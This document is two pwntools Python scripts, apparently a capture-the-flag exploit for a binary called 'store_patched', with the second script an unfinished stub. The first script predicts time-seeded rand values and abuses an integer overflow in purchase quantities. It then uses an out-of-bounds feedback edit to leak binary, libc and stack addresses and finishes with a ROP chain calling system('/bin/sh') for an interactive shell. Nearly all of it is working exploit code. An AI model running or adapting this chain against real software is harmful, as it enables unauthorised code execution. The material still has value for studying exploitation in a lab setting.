#!/usr/bin/env python3
import ctypes
import time
from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('store_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
rd = ctypes.CDLL("libc.so.6")
context.binary = exe
a = rd.srand(int(time.time()))

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x0000555555555fac
        b*0x00005555555561fc
        b*0x0000555555555e8d
        b*0x0000555555556121
        b*0x000055555555629e
        b*0x5555555557dc
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])

cnt = []

for i in range(10):
    val = rd.rand() % 100 + 1
    cnt.append(val)

def checkout():
    slna(b'> ', 3)
    sla(b'Confirm purchase? (y/n): ', b'y')

def best():
    slna(b'> ', 4)


def add(ID, quantity):
    slna(b'> ', 2)
    slna(b'Product ID (0-9): ', ID)
    slna(b'Quantity: ', quantity)

def get_actual_chunk_size(request_size):
    request_size = (request_size+1)*4
    total = request_size + 8
    
    if total < 32:
        return 32
    
    actual_size = (total + 15) & ~15
    
    return actual_size

max = 0
for i in range(10):
    info(f'value {i}: {hex(cnt[i])}')
    if (cnt[i] > max):
        max = cnt[i]

chunk_size = get_actual_chunk_size(max)

add(9, (0x7fffffff-cnt[9]))
checkout()
add(9, 0x7fffffff-2)
checkout()
# add(0, 9)
# checkout()

# go to feedback
slna(b'> ', 5)
slna(b'>> ', 1)
slna(b'Size: ', 0x50)
sa(b'Content: ', b'ahihihievil')
slna(b'>> ', 2)
sna(b'Index: ', 0)

# back to normal
slna(b'>> ', 0)

slna(b'>> ', 4)

# feedback
slna(b'>> ', 5)
slna(b'>> ', 1)
slna(b'Size: ', 0x58)

math1 = (0xffffffffffffffff - 0x78- chunk_size) // 8 
print(f'math: {(math)}')
info(f'chunk size: {hex(chunk_size)}')
load = flat(
    b'realevilehehehee'.ljust(0x50, b'a'),

    math1
)
sa(b'Content: ', load )

# # back to normal
# input()

slna(b'>> ', 0)

slna(b'>> ', 4)

# go to feedback
slna(b'>> ', 5)

slna(b'>> ', 3)
sna(b'ndex: ', 0)
math2= (0xffffffffffffffff - 0x70- chunk_size) // 8 
load = flat(
    b'realevilehehehee'.ljust(0x50, b'a'),

    math2
)
sa(b': ', load)

# # back to normal
# input()

slna(b'>> ', 0)

slna(b'>> ', 4)

# go to feedback

def edit(idx, content):
    slna(b'>> ', 5)
    slna(b'>> ', 3)
    sna(b'ndex: ', idx)
    sa(b': ', content)
    slna(b'>> ', 0)

# binarg leak
edit(0, b'a'*0x40 + p8(0x8))

slna(b'>> ', 1)

ru(b'0    | ')
binary_leak = u64(r(6).ljust(8, b'\0'))
exe.address = binary_leak-0x5008
info(f'binary leak: {hex(binary_leak)}')
info(f'binary base: {hex(exe.address)}')

# libc leak
edit(0, b'a'*0x40 + p64(exe.address + 0x5300) )

slna(b'>> ', 1)
ru(b'0    | ')
libc_leak = u64(r(6).ljust(8, b'\0'))
libc.address = libc_leak-libc.sym._IO_2_1_stdout_
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

# stack leak
edit(0, b'a'*0x40 + p64(libc.sym.environ) )

slna(b'>> ', 1)
ru(b'0    | ')
stack_leak = u64(r(6).ljust(8, b'\0'))
info(f'stack leak: {hex(stack_leak)}')
rip = stack_leak -0x160
print(f'{hex(libc.sym._IO_2_1_stdout_)}')
load = flat(
    # exe.address + 0x5268,
    0x500,
    rip,
    p64(rip)*0x12,
    libc.sym._IO_2_1_stdout_,
    0,
    libc.sym._IO_2_1_stdin_, 0,
    libc.sym._IO_2_1_stderr_, 0,
    b'a'*0x30,
    p64(exe.address +0x5260),

)


edit(0, load)
pop_rdi = 0x000000000002a3e5 + libc.address
load = flat(
    pop_rdi+1,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    libc.sym.system
)
GDB()
slna(b'>> ', 5)
slna(b'>> ', 3)
sna(b'ndex: ', 0)
sa(b': ', load)

p.interactive()
#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('store_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x0000555555555fac
        b*0x00005555555561fc
        b*0x0000555555555e8d
        b*0x0000555555555f6c
        b*0x0000555555556121
        b*0x000055555555629e

        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()
def add(ID, quantity):
    slna(b'> ', 2)
    slna(b'Product ID (0-9): ', ID)
    slna(b'Quantity: ', quantity)

add(0, 10)
add(2, 0x36)

def checkout():
    slna(b'> ', 3)
    sla(b'Confirm purchase? (y/n): ', b'y')

def best():
    slna(b'> ', 4)




p.interactive()
